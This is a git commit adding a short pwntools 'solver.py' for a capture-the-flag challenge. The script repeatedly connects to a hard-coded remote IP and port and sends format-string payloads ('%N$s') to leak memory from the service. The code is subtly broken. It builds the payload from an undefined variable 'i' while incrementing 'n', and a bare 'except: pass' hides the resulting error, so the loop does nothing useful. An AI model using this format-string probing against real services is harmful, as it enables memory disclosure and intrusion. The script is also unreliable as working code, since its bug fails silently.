0d198f73e59b57729d0d3813a7021194a219e913
Ahmed Ezzat <ahmed.ezzat119@outlook.com>
2018-04-23 21:25:48 +0200

    Create solver.py

---
+++ timictf_memo/solver.py
@@ -0,0 +1,22 @@
+from pwn import *
+import sys
+
+n = 1
+context.log_level = 'error'
+while 1:
+    try:
+        r = remote('89.38.210.128', 31339)
+        r.recvuntil("? > ")
+        r.sendline("%" + str(i) + "$s")
+        r.recvline()
+        r.sendline("42")
+        r.recvline()
+        r.sendline("77")
+        r.recvline()
+        r.sendline("111")
+        r.recvline()
+        sys.stdout.write(r.recvline())
+        r.close()
+        n += 1
+    except:
+            pass
